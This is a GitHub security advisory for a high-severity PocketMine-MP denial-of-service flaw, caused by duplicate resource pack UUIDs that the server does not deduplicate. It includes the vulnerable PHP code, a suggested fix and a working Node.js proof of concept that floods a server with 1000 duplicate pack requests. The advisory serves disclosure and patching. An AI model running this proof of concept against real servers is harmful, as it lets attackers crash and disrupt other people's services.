# [H] PocketMine-MP `ResourcePackDataInfoPacket` amplification vulnerability due to lack of resource pack sequence status checking

## Summary
Severity: High
Advisory: GHSA-fqqv-56h5-f57g
CWE: CWE-770
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-09-02
Source: https://github.com/advisories/GHSA-fqqv-56h5-f57g
Type: github-advisory

## Affected
- Packagist: `pocketmine/pocketmine-mp` — affected >=0 <5.32.1

## Details
### Summary

A denial-of-service / out-of-memory vulnerability exists in the `STATUS_SEND_PACKS` handling of `ResourcePackClientResponsePacket`.
PocketMine-MP processes the `packIds` array without verifying that all entries are unique.
A malicious (non-standard) Bedrock client can send multiple duplicate valid pack UUIDs in the same `STATUS_SEND_PACKS` packet, causing the server to send the same pack multiple times. This can quickly exhaust memory and crash the server.
Severity: **High** — Remote DoS from an authenticated client.

---

### Details

Relevant code (simplified):

```php
case ResourcePackClientResponsePacket::STATUS_SEND_PACKS:
    foreach($packet->packIds as $uuid){
        $splitPos = strpos($uuid, "_");
        if($splitPos !== false){
            $uuid = substr($uuid, 0, $splitPos);
        }
        $pack = $this->getPackById($uuid);
        if(!($pack instanceof ResourcePack)){
            $this->disconnectWithError("Unknown pack $uuid requested...");
            return false;
        }
        $this->session->sendDataPacket(ResourcePackDataInfoPacket::create(
            $pack->getPackId(),
            self::PACK_CHUNK_SIZE,
            (int) ceil($pack->getPackSize() / self::PACK_CHUNK_SIZE),
            $pack->getPackSize(),
            $pack->getSha256(),
            false,
            ResourcePackType::RESOURCES
        ));
    }
    break;
```

**Root cause:**

* The `packIds` array is taken directly from the client packet and processed as-is.
* There is no check to ensure that all requested packs are unique.
* A malicious client can craft a `STATUS_SEND_PACKS` packet with many duplicates of a valid UUID.
* Each duplicate results in the server re-sending the same pack, consuming additional memory.

**Why this is unexpected:**

* Mojang's official clients never send duplicates in `packIds`.
* PocketMine assumes the client is well-behaved, but an attacker can bypass this with a custom client.

---

**Suggested fix:**
Before sending packs:

1. Remove duplicates from the incoming `packIds` array.
2. If the difference between the original count and unique count exceeds a small threshold (e.g. > 2 duplicates), immediately disconnect the client with an error.
3. Track which packs have already been sent to this player, and skip any that have already been transferred.

```php
$alreadySent = $this->packsSent ?? [];

// Remove duplicates
$uniquePackIds = array_unique($packet->packIds);

// Detect abuse
if(count($packet->packIds) - count($uniquePackIds) > 2){
    $this->disconnectWithError("Too many duplicate resource pack requests");
    return false;
}

foreach($uniquePackIds as $uuid){
    if(in_array($uuid, $alreadySent, true)){
        continue; // Skip packs already sent to this player
    }
    // existing code...
    $alreadySent[] = $uuid;
}

$this->packsSent = $alreadySent;
```

---

### PoC

1. Join a PocketMine-MP server with at least one resource pack enabled.
2. Using a custom Bedrock client, send a `ResourcePackClientResponsePacket` with:

   * `status = STATUS_SEND_PACKS`
   * `packIds` = many duplicates of a known valid pack UUID.

Example Node.js PoC (requires `bedrock-protocol` and a valid `PACK_UUID`):

```js
import { createClient } from 'bedrock-protocol';

const host = '127.0.0.1';
const port = 19132;
const username = 'test';
const PACK_UUID = '00000000-0000-0000-0000-000000000000'; // replace with a real UUID
const DUPLICATES = 1000;

const client = createClient({
    host,
    port,
    username,
    offline: true
});

client.on('spawn', () => {
    console.log('[*] Sending duplicate pack request...');
    client.queue('resource_pack_client_response', {
        response_status: 'send_packs',
        resourcepackids: Array(DUPLICATES).fill(PACK_UUID)
    });
});
```

---

### Impact

* **Type:** Remote Denial of Service / Memory Exhaustion
* **Who is impacted:** Any PocketMine-MP server with resource packs enabled
* **Requirements:** Attacker must connect to the server (authenticated player)
* **Effect:** Server memory rapidly increases, leading to freeze or crash

## References
- https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-fqqv-56h5-f57g
- https://github.com/pmmp/PocketMine-MP/commit/c417ecd30d20520227b15e09eda87db492ab0a6a
- https://github.com/pmmp/PocketMine-MP/commit/e375437439df51f7862b6b98318394643fcd6724
- https://github.com/pmmp/PocketMine-MP
- https://github.com/pmmp/PocketMine-MP/releases/tag/5.32.1
